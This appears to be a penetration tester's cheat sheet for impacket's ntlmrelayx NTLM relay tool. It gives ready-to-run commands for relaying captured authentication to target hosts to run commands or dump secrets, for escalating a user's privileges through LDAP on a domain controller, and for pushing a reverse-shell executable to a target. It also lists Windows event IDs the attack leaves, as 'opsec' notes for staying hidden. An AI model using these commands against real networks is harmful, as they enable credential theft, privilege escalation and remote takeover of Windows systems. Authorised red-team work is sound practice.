### source
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py  

### Pass-The-Hash with NTHash/NTLM possible
```
# Pass-The-Hash with NET-NTLM/NTLMv1/v2 not possible
```

### relay requests to ip addresses, without -c ntlmrelayx will use secretsdump (must be in the same directory)
```
impacket-ntlmrelayx -tf <rhostFile> -c '<command>'
```

### start relay using ldap (authentication needs to go over HTTP) - use ldaps for secure ldap
```
impacket-ntlmrelayx -t ldap://<dcIp> --escalate-user <user>
```

### serve payload, -t = target, -e payload from file - if client throws smb version-error use: -smb2support
```
impacket-ntlmrelayx -t <rhost> -e <./reverse.exe>
```

### opsec considerations - 
```
Windows Security Log Event IDs
-Logon (4624) -> multiple
-Logoff (4634) -> multiple
-Special Logon (4672) -> multiple

Windows System Logs
Service Control Manager (7040) -> multiple
```

